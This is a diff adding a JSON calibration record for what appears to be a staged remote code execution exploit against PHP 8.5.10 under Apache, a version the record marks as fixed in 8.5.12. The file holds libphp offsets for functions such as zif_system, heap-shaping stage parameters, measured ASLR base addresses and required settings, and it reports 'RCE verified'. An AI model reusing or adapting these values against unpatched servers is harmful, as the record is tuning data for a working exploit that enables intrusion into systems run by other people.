@@ -1,0 +1,66 @@
+{
+  "schema_version": 2,
+  "generated_at": "2026-10-22T18:05:17.313545+00:00",
+  "scope": "local-calibration",
+  "image": "php:8.5.10-apache",
+  "image_digest": "sha256:65c585a58ce5c789e187c925dfbc05a79c6e65fec3ab9a1dfcf900ff8b7efe24",
+  "php_version": "8.5.10",
+  "branch": "8.5",
+  "fixed_in": "8.5.12",
+  "arch": "aarch64",
+  "distro": "trixie",
+  "sapi": "apache2handler",
+  "upstream_commit": "4586f5cc120c82fd468b17469202bac629810ad9",
+  "libphp_path": "/usr/lib/apache2/modules/libphp.so",
+  "libphp_sha256": "5f080d44d3f85c533ebf5dc69d413976a3d009993a5b4fad93fb567503960a41",
+  "libphp": {
+    "zif_system": "0x52e130",
+    "zval_ptr_dtor": "0x75d360",
+    "htdata": "0x690d8"
+  },
+  "stages": {
+    "stage1_n": 841,
+    "stage1_forge_len": 63,
+    "stage2_t": 406,
+    "stage2_v": 16,
+    "stage3_pads": [
+      [
+        31,
+        31
+      ],
+      [
+        31,
+        31
+      ],
+      [
+        31,
+        31
+      ],
+      [
+        31,
+        31
+      ],
+      [
+        31,
+        31
+      ],
+      [
+        31,
+        31
+      ]
+    ],
+    "stage3_carrier": true
+  },
+  "measured": {
+    "zend_chunk_base": "0x7efc19600000",
+    "libphp_base": "0x7efc1b600000"
+  },
+  "config": {
+    "memory_limit": "8M",
+    "session_upload_progress": "1",
+    "workers": 0
+  },
+  "verified": true,
+  "rce": true,
+  "status": "RCE verified with runtime ASLR bases"
+}
